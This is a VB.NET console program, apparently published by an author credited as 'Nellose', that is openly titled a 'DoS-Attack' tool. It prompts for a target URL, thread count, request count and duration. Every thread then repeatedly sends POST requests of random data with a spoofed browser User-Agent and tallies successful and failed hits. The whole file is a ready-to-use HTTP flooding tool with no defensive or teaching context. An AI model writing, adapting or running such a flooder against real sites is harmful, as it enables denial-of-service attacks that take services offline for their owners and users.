Imports System.Net.Http
Imports System.Threading

' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '

Module Losser
    Sub Main()
        Console.Title = "Nellose | DoS-Attack | VB .NET"
        Console.ForegroundColor = ConsoleColor.White

        Console.Write("Enter the link: ")
        Dim EEE As String = Console.ReadLine()

        Console.Write("Enter the number of threads: ")
        Dim YYY As Integer = Convert.ToInt32(Console.ReadLine())

        Console.Write("Enter the number of requests: ")
        Dim ZZZ As Integer = Convert.ToInt32(Console.ReadLine())

        Console.Write("Enter the attack time in seconds: ")
        Dim XXX As Integer = Convert.ToInt32(Console.ReadLine())

        Console.Clear()

        Dim CCC As Integer = 0
        Dim GGG As Integer = 0
        Dim RRR As DateTime = DateTime.Now

        For i As Integer = 1 To YYY
            Dim thread As New Thread(Sub() SSS(EEE, ZZZ, XXX, CCC, GGG, RRR))
            thread.Start()
        Next

        Thread.Sleep(XXX * 1000)

        Console.Clear()
        Console.ForegroundColor = ConsoleColor.Cyan
        Console.WriteLine("Monitoring:")
        Console.WriteLine($"Successful requests: {CCC}")
        Console.WriteLine($"Unsuccessful requests: {GGG}")
        Console.WriteLine($"Attack time: {(DateTime.Now - RRR).TotalSeconds} secound(s)")
    End Sub

    ' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '

    Sub SSS(EEE As String, ZZZ As Integer, XXX As Integer, ByRef CCC As Integer, ByRef GGG As Integer, RRR As DateTime)
        For i As Integer = 1 To ZZZ
            Try
                Dim requestTypes As String() = {"GET", "POST", "PUT", "HEAD", "JSON"}
                For Each requestType In requestTypes
                    Dim VVV As String = AAA()

                    Using client As New HttpClient()
                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

                        Dim response As HttpResponseMessage = client.PostAsync(EEE, New StringContent(VVV)).Result

                        If response.IsSuccessStatusCode Then
                            CCC += 1
                        Else
                            GGG += 1
                        End If
                    End Using
                Next
            Catch ex As Exception
                GGG += 1
            End Try
        Next
    End Sub

    ' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '

    Function AAA() As String
        Dim random As New Random()
        Dim dataLength As Integer = random.Next(1, 1024)
        Dim data As New Text.StringBuilder()

        For i As Integer = 1 To dataLength
            data.Append(Convert.ToChar(random.Next(32, 127)))
        Next

        Return data.ToString()
    End Function
End Module

' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '